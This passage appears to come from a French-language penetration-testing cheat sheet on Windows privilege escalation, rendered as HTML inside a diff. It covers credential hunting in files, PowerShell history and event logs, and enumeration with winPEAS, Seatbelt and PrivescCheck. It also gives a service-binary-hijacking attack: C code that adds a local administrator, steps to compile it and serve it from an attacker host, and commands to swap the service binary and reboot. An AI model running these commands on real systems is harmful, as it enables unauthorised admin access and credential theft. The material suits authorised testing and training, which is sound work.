+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="nb">Get-ChildItem</span> <span class="n">-Path</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span> <span class="n">-Include</span> <span class="p">*.</span><span class="n">ini</span><span class="p">,*.</span><span class="n">kdbx</span><span class="p">,*.</span><span class="n">txt</span><span class="p">,*.</span><span class="n">pdf</span><span class="p">,*.</span><span class="n">xls</span><span class="p">,*.</span><span class="n">xlsx</span><span class="p">,*.</span><span class="n">doc</span><span class="p">,*.</span><span class="n">docx</span><span class="p">,*.</span><span class="n">rar</span><span class="p">,*.</span><span class="n">zip</span><span class="p">,*.</span><span class="n">7z</span><span class="p">,*.</span><span class="n">rdp</span><span class="p">,*.</span><span class="n">rdg</span><span class="p">,*.</span><span class="n">ssetting</span><span class="p">,*.</span><span class="n">settings</span><span class="p">,*.</span><span class="n">log</span><span class="p">,*.</span><span class="n">config</span> <span class="o">-File</span> <span class="n">-Recurse</span> <span class="n">-ErrorAction</span> <span class="n">SilentlyContinue</span>
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>
+<a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="c"># CMD</span>
+<a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a><span class="nb">dir </span><span class="p">/</span><span class="n">s</span> <span class="p">/</span><span class="n">b</span> <span class="p">/</span><span class="n">a</span> <span class="n">C</span><span class="p">:\*.</span><span class="n">kdbx</span> <span class="n">2</span><span class="p">&gt;</span><span class="n">nul</span>
+</code></pre></div></p>
+<p><strong>Lire un fichier</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="c"># Aliases pour Get-Content</span>
+<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="nb">type </span><span class="n">C</span><span class="p">:\</span><span class="n">path</span><span class="p">\</span><span class="n">to</span><span class="p">\</span><span class="n">file</span><span class="p">.</span><span class="n">txt</span>
+<a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a><span class="nb">cat </span><span class="n">C</span><span class="p">:\</span><span class="n">path</span><span class="p">\</span><span class="n">to</span><span class="p">\</span><span class="n">file</span><span class="p">.</span><span class="n">txt</span>
+<a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a><span class="nb">gc </span><span class="n">C</span><span class="p">:\</span><span class="n">path</span><span class="p">\</span><span class="n">to</span><span class="p">\</span><span class="n">file</span><span class="p">.</span><span class="n">txt</span>
+<a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a><span class="nb">Get-Content</span> <span class="n">C</span><span class="p">:\</span><span class="n">path</span><span class="p">\</span><span class="n">to</span><span class="p">\</span><span class="n">file</span><span class="p">.</span><span class="n">txt</span>
+</code></pre></div></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>type C:\path\to\file.txt
+</code></pre></div>
+<p><strong>Exécuter une commande en tant qu'un autre utilisateur</strong></p>
+<p>Nécessite un accès GUI (RDP ou session physique) - le prompt de mot de passe n'accepte pas l'input depuis un bind shell ou WinRM.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>runas /user:&lt;username&gt; cmd
+</code></pre></div>
+<p><strong>Historique PowerShell (Get-History)</strong></p>
+<p>Ne contient que les commandes de la session courante, effacé par <code>Clear-History</code>.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="nb">Get-History</span>
+</code></pre></div>
+<p><strong>Historique PSReadline</strong></p>
+<p>Non effacé par <code>Clear-History</code> - contient l'historique persistant entre les sessions.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="p">(</span><span class="nb">Get-PSReadlineOption</span><span class="p">).</span><span class="n">HistorySavePath</span>
+<a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a><span class="nb">type </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\&lt;</span><span class="n">user</span><span class="p">&gt;\</span><span class="n">AppData</span><span class="p">\</span><span class="n">Roaming</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">PowerShell</span><span class="p">\</span><span class="n">PSReadLine</span><span class="p">\</span><span class="n">ConsoleHost_history</span><span class="p">.</span><span class="n">txt</span>
+<a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>
+<a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">Administrator</span><span class="p">\</span><span class="n">Documents</span><span class="p">&gt;</span> <span class="p">(</span><span class="nb">Get-PSReadlineOption</span><span class="p">).</span><span class="n">HistorySavePath</span>
+<a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">Administrator</span><span class="p">\</span><span class="n">AppData</span><span class="p">\</span><span class="n">Roaming</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">PowerShell</span><span class="p">\</span><span class="n">PSReadLine</span><span class="p">\</span><span class="n">ConsoleHost_history</span><span class="p">.</span><span class="n">txt</span>
+<a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">Administrator</span><span class="p">\</span><span class="n">Documents</span><span class="p">&gt;</span> <span class="nb">cd </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">Administrator</span><span class="p">\</span><span class="n">AppData</span><span class="p">\</span><span class="n">Roaming</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">PowerShell</span><span class="p">\</span><span class="n">PSReadLine</span><span class="p">\</span>
+<a id="__codelineno-18-7" name="__codelineno-18-7" href="#__codelineno-18-7"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">Administrator</span><span class="p">\</span><span class="n">AppData</span><span class="p">\</span><span class="n">Roaming</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">PowerShell</span><span class="p">\</span><span class="n">PSReadLine</span><span class="p">&gt;</span> <span class="nb">type </span><span class="p">*</span>
+<a id="__codelineno-18-8" name="__codelineno-18-8" href="#__codelineno-18-8"></a><span class="n">C</span><span class="p">:\</span><span class="n">users</span><span class="p">\</span><span class="n">support</span><span class="p">\</span><span class="n">admintool</span><span class="p">.</span><span class="n">exe</span> <span class="n">hghgib6vHT3bVWf</span> <span class="n">cmd</span>
+<a id="__codelineno-18-9" name="__codelineno-18-9" href="#__codelineno-18-9"></a><span class="p">&lt;</span><span class="n">SNIP</span><span class="p">&gt;</span>
+</code></pre></div>
+<p><strong>Transcripts PowerShell</strong></p>
+<p>Enregistrent toutes les commandes et leur output, peuvent contenir des credentials en clair.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="nb">type </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">Public</span><span class="p">\</span><span class="n">Transcripts</span><span class="p">\</span><span class="n">transcript01</span><span class="p">.</span><span class="n">txt</span>
+</code></pre></div>
+<p><strong>Se connecter en WinRM avec des credentials</strong></p>
+<p>Équivalent Windows de SSH, basé sur HTTP/HTTPS, port 5985 (HTTP) ou 5986 (HTTPS).</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="nv">$password</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="s2">"&lt;password&gt;"</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
+<a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a><span class="nv">$cred</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span><span class="p">(</span><span class="s2">"&lt;username&gt;"</span><span class="p">,</span> <span class="nv">$password</span><span class="p">)</span>
+<a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a><span class="nb">Enter-PSSession</span> <span class="n">-ComputerName</span> <span class="p">&lt;</span><span class="n">host</span><span class="p">&gt;</span> <span class="n">-Credential</span> <span class="nv">$cred</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>evil-winrm<span class="w"> </span>-i<span class="w"> </span>&lt;ip&gt;<span class="w"> </span>-u<span class="w"> </span><span class="s1">'&lt;username&gt;'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'&lt;password&gt;'</span>
+<a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>download<span class="w"> </span>fichier
+<a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>upload<span class="w"> </span>fichier
+</code></pre></div>
+<p><strong>Event Viewer</strong></p>
+<p>Logs les scripts PowerShell exécutés. Dans l'Event Viewer : <code>Applications and Services Logs &gt; Microsoft &gt; Windows &gt; PowerShell &gt; Operational</code>, filtrer par Event ID 4104. Chercher des mots de passe dans les entrées.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="nb">Get-WinEvent</span> <span class="n">-LogName</span> <span class="s2">"Microsoft-Windows-PowerShell/Operational"</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">Id</span> <span class="o">-eq</span> <span class="n">4104</span><span class="p">}</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">TimeCreated</span><span class="p">,</span> <span class="n">Message</span> <span class="p">|</span> <span class="nb">Format-List</span>
+</code></pre></div>
+<p><strong>Chercher des creds</strong>
+  - Historique PowerShell : <code>Get-History</code>
+  - Vault Windows : <code>cmdkey /list</code>
+  - Notes / sticky notes : <code>C:\Users\*\AppData\Local\...</code></p>
+<h3 id="enumeration-automatique">Enumération automatique</h3>
+<h4 id="privesccheck">PrivescCheck</h4>
+<p>https://github.com/itm4n/PrivescCheck</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>wget<span class="w"> </span>https://github.com/itm4n/PrivescCheck/releases/latest/download/PrivescCheck.ps1
+<a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>
+<a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a>powershell<span class="w"> </span>-ep<span class="w"> </span>bypass<span class="w"> </span>-c<span class="w"> </span><span class="s2">". .\PrivescCheck.ps1; Invoke-PrivescCheck -Report PRIVCHECK -Format HTML"</span>
+</code></pre></div>
+<h4 id="winpeas">winPEAS</h4>
+<p>https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS</p>
+<p>Peut être bloqué par l'AV. Alternatives : Seatbelt, JAWS. Ne remplace pas l'énumération manuelle (peut rater des fichiers, mal identifier l'OS, etc.).</p>
+<p>Formats disponibles sur Kali dans <code>/usr/share/peass/winpeas/</code> :</p>
+<table>
+<thead>
+<tr>
+<th>Format</th>
+<th>Avantages</th>
+<th>Inconvénients</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>.exe</code></td>
+<td>Plus complet, standalone</td>
+<td>Détecté facilement par AV</td>
+</tr>
+<tr>
+<td><code>.ps1</code></td>
+<td>Flexible, AMSI peut être bypassé</td>
+<td>AMSI, politique d'exécution restrictive</td>
+</tr>
+<tr>
+<td><code>.bat</code></td>
+<td>Furtif, pas de dépendances</td>
+<td>Très limité en fonctionnalités</td>
+</tr>
+</tbody>
+</table>
+<p>AMSI (Antimalware Scan Interface) : interface Windows qui permet aux AV de scanner les scripts PowerShell en mémoire avant exécution, même obfusqués.</p>
+<p>Recommandation pentest : <code>.ps1</code> avec bypass AMSI si l'AV est un obstacle, sinon <code>.exe</code> pour les résultats les plus complets.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="c1"># Kali : copier le binaire et servir via HTTP</span>
+<a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>cp<span class="w"> </span>/usr/share/peass/winpeas/winPEASx64.exe<span class="w"> </span>.
+<a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a>python3<span class="w"> </span>-m<span class="w"> </span>http.server<span class="w"> </span><span class="m">80</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="c"># Cible : télécharger et exécuter</span>
+<a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a><span class="nb">iwr </span><span class="n">-uri</span> <span class="n">http</span><span class="p">://&lt;</span><span class="n">ip</span><span class="p">&gt;/</span><span class="n">winPEASx64</span><span class="p">.</span><span class="n">exe</span> <span class="n">-Outfile</span> <span class="n">winpeas</span><span class="p">.</span><span class="n">exe</span>
+<a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a>
+<a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a><span class="p">.\</span><span class="n">winpeas</span><span class="p">.</span><span class="n">exe</span> <span class="n">all</span> <span class="p">&gt;</span> <span class="n">winpeas</span><span class="p">.</span><span class="n">txt</span>
+<a id="__codelineno-25-5" name="__codelineno-25-5" href="#__codelineno-25-5"></a><span class="p">.\</span><span class="n">winpeas</span><span class="p">.</span><span class="n">exe</span> <span class="n">all</span> <span class="p">|</span> <span class="nb">Tee-Object</span> <span class="n">-FilePath</span> <span class="n">winpeas</span><span class="p">.</span><span class="n">txt</span>
+</code></pre></div>
+<p><strong>Parse export</strong>
+https://github.com/jsdlm/scripts/blob/main/privesc/peasParser.py
+<div class="highlight"><pre><span></span><code><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>python3<span class="w"> </span>peasParser.py<span class="w"> </span>winpeas.txt
+</code></pre></div></p>
+<h4 id="seatbelt">Seatbelt</h4>
+<p>https://github.com/GhostPack/Seatbelt.git</p>
+<p>Compiler sur une machine Windows avec VS Build Tools, transférer le binaire sur la cible.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a># Prérequis sur la machine de compilation
+<a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>winget install Microsoft.VisualStudio.2022.BuildTools
+<a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a>git clone https://github.com/GhostPack/Seatbelt.git
+<a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a>cd Seatbelt
+<a id="__codelineno-27-5" name="__codelineno-27-5" href="#__codelineno-27-5"></a>msbuild Seatbelt.sln /p:Configuration=Release
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="c"># Cible : télécharger et exécuter</span>
+<a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a><span class="nb">iwr </span><span class="n">-uri</span> <span class="n">http</span><span class="p">://&lt;</span><span class="n">ip</span><span class="p">&gt;/</span><span class="n">Seatbelt</span><span class="p">.</span><span class="n">exe</span> <span class="n">-Outfile</span> <span class="n">Seatbelt</span><span class="p">.</span><span class="n">exe</span>
+<a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a><span class="p">.\</span><span class="n">Seatbelt</span><span class="p">.</span><span class="n">exe</span> <span class="n">-group</span><span class="p">=</span><span class="n">all</span>
+<a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a><span class="p">.\</span><span class="n">Seatbelt</span><span class="p">.</span><span class="n">exe</span> <span class="n">-group</span><span class="p">=</span><span class="n">all</span> <span class="p">&gt;</span> <span class="n">output</span><span class="p">.</span><span class="n">txt</span>
+</code></pre></div>
+<p><strong>si .NET 3.5 absent sur la cible</strong></p>
+<p>Recompiler en ciblant .NET 4.x. Vérifier la version disponible sur la machine de compilation, modifier <code>Seatbelt\Seatbelt.csproj</code>, puis recompiler.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a># Vérifier les versions .NET disponibles
+<a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>winget install Microsoft.DotNet.Framework.DeveloperPack_4
+<a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a>dir "C:\Program Files (x86)\Reference Assemblies\Microsoft\Framework\.NETFramework\"
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a><span class="cm">&lt;!-- Seatbelt.csproj : modifier la ligne TargetFrameworkVersion --&gt;</span>
+<a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a><span class="nt">&lt;TargetFrameworkVersion&gt;</span>v4.8.1<span class="nt">&lt;/TargetFrameworkVersion&gt;</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>msbuild Seatbelt.sln /p:Configuration=Release
+</code></pre></div>
+<h2 id="windows-services">Windows Services</h2>
+<h3 id="service-binary-hijacking">Service Binary Hijacking</h3>
+<h4 id="manuel">Manuel</h4>
+<p><strong>Lister les services en cours avec leur binaire</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="nb">Get-CimInstance</span> <span class="n">Win32_Service</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">Name</span><span class="p">,</span> <span class="n">State</span><span class="p">,</span> <span class="n">StartMode</span><span class="p">,</span> <span class="n">PathName</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">State</span> <span class="o">-like</span> <span class="s1">'Running'</span><span class="p">}</span>
+<a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a>
+<a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a><span class="nb">Get-CimInstance</span> <span class="n">Win32_Service</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">Name</span><span class="p">,</span> <span class="n">State</span><span class="p">,</span> <span class="n">StartMode</span><span class="p">,</span> <span class="n">PathName</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">PathName</span> <span class="o">-notmatch</span> <span class="s1">'C:\\Windows'</span><span class="p">}</span>
+<a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a>
+<a id="__codelineno-32-5" name="__codelineno-32-5" href="#__codelineno-32-5"></a><span class="nb">Get-CimInstance</span> <span class="n">Win32_Service</span> <span class="n">-Filter</span> <span class="s2">"Name='EnterpriseService'"</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">Name</span><span class="p">,</span> <span class="n">State</span><span class="p">,</span> <span class="n">StartMode</span><span class="p">,</span> <span class="n">StartName</span><span class="p">,</span> <span class="n">PathName</span>
+</code></pre></div>
+<p><strong>Vérifier les permissions sur un binaire de service</strong></p>
+<p>Masks : <code>F</code> = Full, <code>M</code> = Modify, <code>RX</code> = Read+Execute, <code>R</code> = Read, <code>W</code> = Write.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>icacls "C:\xampp\mysql\bin\mysqld.exe"
+</code></pre></div>
+<p>Si pas les droits sur le binaire vérifier les droits sur le folder, si droits <code>M</code> : renommer le folder et en créer un nouveau avec son binaire malveillant.</p>
+<p><strong>Créer un binaire malveillant (ajoute un user admin)</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
+<a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-34-3" name="__codelineno-34-3" href="#__codelineno-34-3"></a><span class="w">  </span><span class="n">system</span><span class="p">(</span><span class="s">"net user johndoe Password123! /add"</span><span class="p">);</span>
+<a id="__codelineno-34-4" name="__codelineno-34-4" href="#__codelineno-34-4"></a><span class="w">  </span><span class="n">system</span><span class="p">(</span><span class="s">"net localgroup administrators johndoe /add"</span><span class="p">);</span>
+<a id="__codelineno-34-5" name="__codelineno-34-5" href="#__codelineno-34-5"></a><span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<a id="__codelineno-34-6" name="__codelineno-34-6" href="#__codelineno-34-6"></a><span class="p">}</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
+<a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-35-3" name="__codelineno-35-3" href="#__codelineno-35-3"></a><span class="w">  </span><span class="n">system</span><span class="p">(</span><span class="s">"net user enterpriseuser Password123!"</span><span class="p">);</span>
+<a id="__codelineno-35-4" name="__codelineno-35-4" href="#__codelineno-35-4"></a><span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<a id="__codelineno-35-5" name="__codelineno-35-5" href="#__codelineno-35-5"></a><span class="p">}</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a><span class="c1"># Kali : compiler et servir</span>
+<a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a>x86_64-w64-mingw32-gcc<span class="w"> </span>adduser.c<span class="w"> </span>-o<span class="w"> </span>adduser.exe
+<a id="__codelineno-36-3" name="__codelineno-36-3" href="#__codelineno-36-3"></a>python3<span class="w"> </span>-m<span class="w"> </span>http.server<span class="w"> </span><span class="m">80</span>
+</code></pre></div>
+<p><strong>Remplacer le binaire et déclencher l'exécution</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a><span class="nb">iwr </span><span class="n">-uri</span> <span class="n">http</span><span class="p">://&lt;</span><span class="n">ip</span><span class="p">&gt;/</span><span class="n">adduser</span><span class="p">.</span><span class="n">exe</span> <span class="n">-Outfile</span> <span class="n">adduser</span><span class="p">.</span><span class="n">exe</span>
+<a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a><span class="nb">move </span><span class="n">C</span><span class="p">:\</span><span class="n">xampp</span><span class="p">\</span><span class="n">mysql</span><span class="p">\</span><span class="n">bin</span><span class="p">\</span><span class="n">mysqld</span><span class="p">.</span><span class="n">exe</span> <span class="n">mysqld</span><span class="p">.</span><span class="n">exe</span>        <span class="c"># backup</span>
+<a id="__codelineno-37-3" name="__codelineno-37-3" href="#__codelineno-37-3"></a><span class="nb">move </span><span class="p">.\</span><span class="n">adduser</span><span class="p">.</span><span class="n">exe</span> <span class="n">C</span><span class="p">:\</span><span class="n">xampp</span><span class="p">\</span><span class="n">mysql</span><span class="p">\</span><span class="n">bin</span><span class="p">\</span><span class="n">mysqld</span><span class="p">.</span><span class="n">exe</span>
+<a id="__codelineno-37-4" name="__codelineno-37-4" href="#__codelineno-37-4"></a>
+<a id="__codelineno-37-5" name="__codelineno-37-5" href="#__codelineno-37-5"></a><span class="c"># Redémarrer le service (si permissions suffisantes)</span>
+<a id="__codelineno-37-6" name="__codelineno-37-6" href="#__codelineno-37-6"></a><span class="n">net</span> <span class="n">stop</span> <span class="n">mysql</span>
+<a id="__codelineno-37-7" name="__codelineno-37-7" href="#__codelineno-37-7"></a><span class="n">net</span> <span class="nb">start </span><span class="n">mysql</span>
+</code></pre></div>
+<p><strong>Si pas les droits de redémarrer - vérifier le Startup Type et rebooter</strong></p>
+<p>Si le service est <code>Auto</code>, un reboot suffit. Vérifier <code>SeShutdownPrivilege</code>.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a><span class="nb">Get-CimInstance</span> <span class="n">-ClassName</span> <span class="n">win32_service</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">Name</span><span class="p">,</span> <span class="n">State</span><span class="p">,</span> <span class="n">StartMode</span><span class="p">,</span> <span class="n">PathName</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">Name</span> <span class="o">-like</span> <span class="s1">'mysqld'</span><span class="p">}</span>
+<a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a>
+<a id="__codelineno-38-3" name="__codelineno-38-3" href="#__codelineno-38-3"></a><span class="n">whoami</span> <span class="p">/</span><span class="n">priv</span>
+<a id="__codelineno-38-4" name="__codelineno-38-4" href="#__codelineno-38-4"></a><span class="n">shutdown</span> <span class="p">/</span><span class="nb">r </span><span class="p">/</span><span class="n">t</span> <span class="n">0</span>
+</code></pre></div>
+<p><strong>Vérifier que l'exploitation a fonctionné</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a>net user
+<a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a>net localgroup administrators
+</code></pre></div>
+<h4 id="powerup">PowerUp</h4>
+<p>Crée un user <code>john</code> / <code>Password123!</code> ajouté aux admins locaux par défaut.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a><span class="c1"># Kali</span>
+<a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a>cp<span class="w"> </span>/usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1<span class="w"> </span>.
+<a id="__codelineno-40-3" name="__codelineno-40-3" href="#__codelineno-40-3"></a>python3<span class="w"> </span>-m<span class="w"> </span>http.server<span class="w"> </span><span class="m">80</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a><span class="nb">iwr </span><span class="n">-uri</span> <span class="n">http</span><span class="p">://&lt;</span><span class="n">ip</span><span class="p">&gt;/</span><span class="n">PowerUp</span><span class="p">.</span><span class="n">ps1</span> <span class="n">-Outfile</span> <span class="n">PowerUp</span><span class="p">.</span><span class="n">ps1</span>
+<a id="__codelineno-41-2" name="__codelineno-41-2" href="#__codelineno-41-2"></a><span class="n">powershell</span> <span class="n">-ep</span> <span class="n">bypass</span>
+<a id="__codelineno-41-3" name="__codelineno-41-3" href="#__codelineno-41-3"></a><span class="p">.</span> <span class="p">.\</span><span class="n">PowerUp</span><span class="p">.</span><span class="n">ps1</span>
+<a id="__codelineno-41-4" name="__codelineno-41-4" href="#__codelineno-41-4"></a><span class="nb">Get-ModifiableServiceFile</span>
+<a id="__codelineno-41-5" name="__codelineno-41-5" href="#__codelineno-41-5"></a><span class="c"># Puis utiliser l'AbuseFunction indiquée dans l'output</span>
+<a id="__codelineno-41-6" name="__codelineno-41-6" href="#__codelineno-41-6"></a><span class="nb">Install-ServiceBinary</span> <span class="n">-Name</span> <span class="s1">'&lt;service&gt;'</span>
+</code></pre></div>
+<p>Si l'AbuseFunction échoue (ex: argument avec chemin dans le PathName), faire l'exploitation manuellement.</p>
+<h3 id="dll-hijacking">DLL Hijacking</h3>
+<h4 id="manuel_1">Manuel</h4>
+<p><a href="../Developpement/DLL%20Hijacking.html">DLL Hijacking</a></p>
+<h4 id="powerup_1">PowerUp</h4>
+<p>Ne détecte que les DLLs déjà chargées, pas les <code>NAME NOT FOUND</code>. Les erreurs de process introuvables sont normales.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a><span class="c1"># Kali</span>
+<a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a>cp<span class="w"> </span>/usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1<span class="w"> </span>.
